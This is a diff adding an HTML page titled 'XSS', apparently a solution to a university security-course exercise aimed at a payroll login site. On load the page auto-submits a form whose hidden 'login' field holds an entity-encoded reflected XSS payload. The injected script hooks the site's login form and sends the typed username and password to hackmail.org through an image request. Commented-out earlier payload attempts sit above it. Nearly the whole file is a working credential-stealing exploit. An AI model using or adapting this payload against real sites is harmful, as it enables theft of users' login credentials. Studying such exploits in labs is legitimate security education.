@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>XSS</title>
+  </head>
+  <body onload="document.forms[0].submit()">
+    <form action="http://payroll.gatech.edu" onsubmit="" method="POST">
+        <!-- <input type="hidden" name="login" value=""><img src="x" style="opacity: 0;" onerror=""> -->
+        <!-- <input type="hidden" name="login" value=""><script></script><i i=""> -->
+        <!-- <input type="hidden" name="login" value=""><script></script><i i="">
+        <input type="hidden" name="login" value=""><script></script><i i="">
+        <input type="hidden" name="login" value=""><script></script><i i=""> -->
+
+        <input type="hidden" name="login" value="&#x22;&#x3E;&#x3C;script&#x3E;;
+           var f=document.getElementsByTagName(&#x27;form&#x27;)[0];
+           var send=function(p) {
+		var a=new Image();a.src=&#x22;http://hackmail.org/sendmail.php?       &#x26;username=VGFyZ2V0MkVhc3RlckVnZ1N1bW1lcjIwMTkNCg&#x26;payload=&#x22;+p+&#x22;&#x26;random=&#x22;+Math.random();
+	   document.append(a)};
+
+	f.onsubmit=function(){
+		var a=$(&#x27;input[name=login]&#x27;).val();
+                var b=$(&#x27;input[name=pw]&#x27;).val();
+		send(a+&#x22; &#x22;+b)};&#x3C;/script&#x3E;&#x3C;i i=&#x22;">
+    </form>
+  </body>
+</html>
